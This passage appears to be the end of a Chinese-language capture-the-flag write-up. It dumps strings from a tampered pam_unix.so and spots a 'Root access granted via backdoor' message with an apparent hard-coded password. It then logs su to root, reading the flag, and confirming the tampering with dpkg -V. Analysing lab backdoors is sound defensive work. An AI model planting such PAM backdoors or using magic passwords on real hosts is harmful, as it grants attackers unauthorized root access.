sockaddr_ax25
sin6_flowinfo
RPC_CANTDECODEARGS
fclose
RE_why
lctrl
RE_lb
xdrproc_t
strncmp
_do_setpass
ah_ops
RPC_RPCBFAILURE
sptr
sockaddr
sin6_scope_id
high
sockaddr_ns
clnt_sperrno
RPC_CANTDECODERES
pam_sm_chauthtok
__int32_t
xdr_op
md5pass
ah_verf
IPPROTO_IGMP
IPPORT_TFTP
pam_unix_passwd.c
IPPORT_USERRESERVED
IPPORT_NAMESERVER
RPC_PROGNOTREGISTERED
IPPORT_SYSTAT
cl_freeres
x_getint32
__u6_addr16
__caddr_t
IPPROTO_SCTP
IPPROTO_IP
auth_ops
sockaddr_ipx
ah_nextverf
newpass
IPPORT_WHOIS
getNISserver
IPPORT_CMDSERVER
IPPORT_FTP
in_addr_t
Goodcrypt_md5
IPPROTO_ESP
_unix_getpwnam
x_getpostn
IPPROTO_EGP
sockaddr_at
RPC_INTR
ah_refresh
IPPROTO_IPV6
__u6_addr8
RPC_INPROGRESS
clnt_ops
CLIENT
IPPORT_FINGER
AUTH_BADVERF
_unix_comesfromsource
IPPORT_WHOSERVER
unlock_pwdf
__uint16_t
IPPROTO_MAX
RPC_CANTSEND
oa_length
x_getbytes
RPC_SUCCESS
in_port_t
RPC_VERSMISMATCH
IPPORT_RJE
IPPORT_BIFFUDP
strtok_r
RPC_SYSTEMERROR
re_status
sin_zero
x_destroy
RPC_UNKNOWNADDR
IPPORT_SMTP
s_addr
cl_geterr
x_ops
sa_family_t
cl_private
s_luser
cl_call
bool_t
IPPROTO_BEETPH
RPC_TIMEDOUT
pam_set_item
x_putint32
sockaddr_inarp
enum_t
oa_flavor
sin_family
tv_usec
__u_long
AUTH_OK
sockaddr_iso
AUTH
IPPROTO_UDP
XDR_FREE
s_npas
x_public
RE_errno
yperr_string
remember
opaque_auth
rounds
cl_ops
IPPROTO_IPIP
IPPORT_LOGINSERVER
x_putlong
IPPORT_ROUTESERVER
unix_update_passwd
ah_cred
RPC_TLIERROR
towhat
x_inline
forwho
IPPORT_DISCARD
x_putbytes
s_pas
ah_marshal
IPPORT_ECHO
cl_abort
xdr_ops
RPC_PROGUNAVAIL
opwfile
IPPROTO_PUP
check_old_password
XDR_ENCODE
sin_port
IPPROTO_AH
sockaddr_eon
authunix_create_default
IPPROTO_ICMP
unlocked
__u6_addr32
sockaddr_un
create_password_hash
newpw
yp_get_default_domain
RPC_STALERACHANDLE
__in6_u
sin_addr
ah_validate
RPC_FAILED
RE_vers
cl_destroy
fopen
AUTH_BADCRED
save_old_password
done
IPPROTO_IDP
x_setpostn
fgets
timeval
yppwd
long double
oldpass
AUTH_FAILED
sin6_port
IPPORT_NETSTAT
IPPROTO_RSVP
IPPROTO_GRE
x_base
IPPORT_EXECSERVER
AUTH_REJECTEDVERF
yp_master
IPPORT_TTYLINK
sin6_family
_pam_unix_approve_pass
sockaddr_dl
oa_base
IPPORT_TELNET
RPC_UNKNOWNHOST
RPC_UNKNOWNPROTO
IPPROTO_PIM
sun_family
ah_private
RPC_PROGVERSMISMATCH
RPC_CANTENCODEARGS
sun_path
sockaddr_in
auth_stat
__uint8_t
_unix_verify_shadow
IPPROTO_MTP
x_getlong
IPPROTO_TP
x_op
fromwhat
tv_sec
pass_min_len
IPPORT_DAYTIME
AUTH_TOOWEAK
IPPROTO_UDPLITE
cl_control
IPPROTO_COMP
IPPROTO_ENCAP
RPC_NOBROADCAST
rpc_err
unix_update_shadow
cl_auth
timeout
RPC_N2AXLATEFAILURE
domainname
clnt
ah_key
__suseconds_t
IPPORT_SUPDUP
__time_t
des_block
IPPORT_EFSSERVER
IPPORT_TIMESERVER
clnt_create
clnt_stat
IPPROTO_TCP
strcmp
IPPORT_RESERVED
sa_family
strdup
getrpcport
IPPROTO_MPLS
pass_new
RPC_UDERROR
x_private
__u_int
pam_prompt
x_handy
s_uid
IPPORT_MTP
ah_destroy
sockaddr_in6
IPPROTO_DCCP
sa_data
is_pwd_shadowed
sin6_addr
IPPROTO_RAW
sockaddr_x25
retry
AUTH_INVALIDRESP
RPC_CANTRECV
RPC_PROCUNAVAIL
RPC_AUTHERROR
pam_modutil_getlogin
pam_unix_sess.c
login_name
service
user_name
pam_sm_open_session
pam_sm_close_session
__stream
quiet
yp_match
_ISgraph
_pam_failed_auth
__ssize_t
write
__lineptr
type
strcasecmp
_unix_cleanup
atoi
__nptr
__builtin_memset
_ISprint
get_pwd_hash
_cleanup_failures
failure
spasswd
matched
yp_bind
strsep
filename
__builtin_memcpy
_ISpunct
suid
userlen
verify_pwd_hash
strcpy
_ISxdigit
_ISupper
__ctype_b_loc
_IScntrl
support.c
void_old
count
buflen
shome
feof
search_key
_ISalpha
_ISblank
_ISalnum
slogin
pam_fail_delay
_ISspace
sgid
getline
userinfo
_ISlower
strtol
__getdelim
sgecos
_unix_run_helper_binary
yp_unbind
ruser
data_name
sshell
strncasecmp
_ISdigit
files
rhost
error_status
__glibc_reserved
st_ctim
unlink
st_blksize
st_blocks
MD5Context
uint32
crypted
st_mtim
found
curdays
__dev_t
result
where
usleep
strip_hpux_aging
spwdent
nbuf
umask
__blksize_t
st_uid
crypt_make_salt
st_rdev
GoodMD5Update
__syscall_slong_t
algoid
ulckpwdf
timezone
__mode_t
fchown
st_gid
putspent
howmany
stpcpy
st_size
getpid
clock
fstat
__blkcnt_t
tz_minuteswest
__ino_t
const_charp
tmppass
unix_selinux_confined
crypt_md5_wrapper
__builtin_strchr
bits
__fd
pam_modutil_getspnam
pam_modutil_getpwnam
rename
nullok
__fxstat
oldmask
st_nlink
GoodMD5Final
passverify.c
st_dev
timespec
fchmod
gettimeofday
assigned_passwd
i64c
fputs
fgetspent
fgetpwent
tv_nsec
valid
stmpent
GoodMD5Init
st_mode
putpwent
fsync
tz_dsttime
Brokencrypt_md5
hash_len
st_ino
__statbuf
MD5_CTX
__nlink_t
st_atim
wroteentry
xdr_yppasswd
xdr_int
yppasswd_xdr.c
xdrs
xdr_string
objp
xdr_xpasswd
longs
md5_good.c
final
to64
ctx1
strncat
__builtin_strlen
byteReverse
itoa64
GoodMD5Transform
digest
magic
BrokenMD5Update
BrokenMD5Final
BrokenMD5Transform
md5_broken.c
BrokenMD5Init
 $-(
Q@I$
Q@I$
Q@J$
Q@J$
# %!
# %!x
# %!
# %!"
# %!
# %!x
# %!
# %!"
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bigcrypt.c
pam_unix_acct.c
envp.0
pam_unix_auth.c
setcred_free
pam_unix_passwd.c
_unix_verify_shadow
_pam_unix_approve_pass
pam_unix_sess.c
support.c
_unix_cleanup
_unix_run_helper_binary
_cleanup_failures
search_key.constprop.0
unix_args
passverify.c
crypt_make_salt
valid.2
buf.1
nbuf.0
yppasswd_xdr.c
md5_good.c
itoa64
md5_broken.c
__FRAME_END__
xdr_yppasswd
_unix_run_verify_binary
_set_ctrl
BrokenMD5Transform
get_account_info
Goodcrypt_md5
BrokenMD5Init
bigcrypt
_fini
save_old_password
crypt_md5_wrapper
unix_update_passwd
unix_update_shadow
create_password_hash
Brokencrypt_md5
__dso_handle
_unix_getpwnam
GoodMD5Final
_unix_comesfromsource
GoodMD5Transform
_make_remark
_DYNAMIC
is_pwd_shadowed
unlock_pwdf
BrokenMD5Final
unix_selinux_confined
GoodMD5Init
get_pwd_hash
check_shadow_expiry
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
GoodMD5Update
_unix_blankpasswd
_unix_verify_password
verify_pwd_hash
_init
BrokenMD5Update
xdr_xpasswd
pam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9
free@GLIBC_2.2.5
pam_modutil_getpwnam@LIBPAM_MODUTIL_1.0
strcasecmp@GLIBC_2.2.5
__errno_location@GLIBC_2.2.5
unlink@GLIBC_2.2.5
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
_exit@GLIBC_2.2.5
strcpy@GLIBC_2.2.5
pam_set_item@LIBPAM_1.0
pam_get_data@LIBPAM_1.0
putspent@GLIBC_2.2.5
sigaction@GLIBC_2.2.5
pam_sm_setcred
pam_prompt@LIBPAM_EXTENSION_1.0
write@GLIBC_2.2.5
getpid@GLIBC_2.2.5
clock@GLIBC_2.2.5
yp_unbind@LIBNSL_1.0
fclose@GLIBC_2.2.5
stpcpy@GLIBC_2.2.5
yp_master@LIBNSL_1.0
dcgettext@GLIBC_2.2.5
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
dup2@GLIBC_2.2.5
strchr@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
gettimeofday@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
pam_modutil_getlogin@LIBPAM_MODUTIL_1.0
strncat@GLIBC_2.2.5
authunix_create_default@GLIBC_2.2.5
pipe@GLIBC_2.2.5
yp_match@LIBNSL_1.0
strtok_r@GLIBC_2.2.5
pam_sm_chauthtok
read@GLIBC_2.2.5
fgets@GLIBC_2.2.5
execve@GLIBC_2.2.5
xdr_string@GLIBC_2.2.5
calloc@GLIBC_2.2.5
pam_sm_close_session
__getdelim@GLIBC_2.2.5
strcmp@GLIBC_2.2.5
getpwnam@GLIBC_2.2.5
feof@GLIBC_2.2.5
__gmon_start__
umask@GLIBC_2.2.5
strtol@GLIBC_2.2.5
memcpy@GLIBC_2.14
time@GLIBC_2.2.5
fileno@GLIBC_2.2.5
malloc@GLIBC_2.2.5
strncasecmp@GLIBC_2.2.5
fflush@GLIBC_2.2.5
pam_sm_acct_mgmt
strsep@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
fgetpwent@GLIBC_2.2.5
syslog@GLIBC_2.2.5
__fxstat@GLIBC_2.2.5
yp_bind@LIBNSL_1.0
xdr_int@GLIBC_2.2.5
fgetspent@GLIBC_2.2.5
crypt_r@XCRYPT_2.0
yperr_string@LIBNSL_1.0
clnt_sperrno@GLIBC_2.2.5
fchmod@GLIBC_2.2.5
pam_syslog@LIBPAM_EXTENSION_1.0
fsync@GLIBC_2.2.5
pam_sm_open_session
waitpid@GLIBC_2.2.5
clnt_create@GLIBC_2.2.5
fchown@GLIBC_2.2.5
fopen@GLIBC_2.2.5
ulckpwdf@GLIBC_2.2.5
pam_get_item@LIBPAM_1.0
dcngettext@GLIBC_2.2.5
rename@GLIBC_2.2.5
pam_set_data@LIBPAM_1.0
pam_modutil_read@LIBPAM_MODUTIL_1.0
pam_get_user@LIBPAM_1.0
pam_modutil_getspnam@LIBPAM_MODUTIL_1.0
pam_sm_authenticate
yp_get_default_domain@LIBNSL_1.0
pam_fail_delay@LIBPAM_1.0
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
strdup@GLIBC_2.2.5
putpwent@GLIBC_2.2.5
pam_get_authtok@LIBPAM_EXTENSION_1.1
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
getrpcport@GLIBC_2.2.5
__ctype_b_loc@GLIBC_2.3
usleep@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
.debug_ranges
````

主要是这里有问题

```
...
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
...
```

貌似留了一个后门

```
morri@Backdoor1:/opt$ su -
Password: 
root@Backdoor1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor1:~# cat /root/root.txt 
flag{root-5d363bb914c59fd1cd2b59e998bedb4f}
```

好的就是后面，哈哈哈，dpkg -V也可以看到，看个人喜欢

```
root@Backdoor1:~# dpkg -V
??5?????? c /etc/irssi.conf
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/grub.d/10_linux
??5?????? c /etc/grub.d/40_custom
??5?????? c /etc/sudoers
??5?????? c /etc/inspircd/inspircd.conf
??5?????? c /etc/inspircd/inspircd.motd
??5?????? c /etc/issue
```

